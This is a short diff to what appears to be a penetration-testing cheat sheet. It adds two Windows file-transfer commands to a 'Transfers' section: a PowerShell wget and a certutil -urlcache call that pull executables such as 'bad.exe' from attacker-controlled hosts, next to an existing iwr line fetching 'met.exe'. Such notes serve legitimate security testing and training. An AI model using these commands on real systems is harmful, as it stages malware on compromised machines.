@@ -60,6 +60,8 @@
 
 #### Transfers
 `PS iwr -uri http://attacker.IP/met.exe -Outfile met.exe`<br>
+`powershell wget -Uri http://attacker_IP/name.exe -OutFile C:\destination\directory\name.exe`<br>
+`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`<br>
 
 ## Pivoting and Tunneling
 
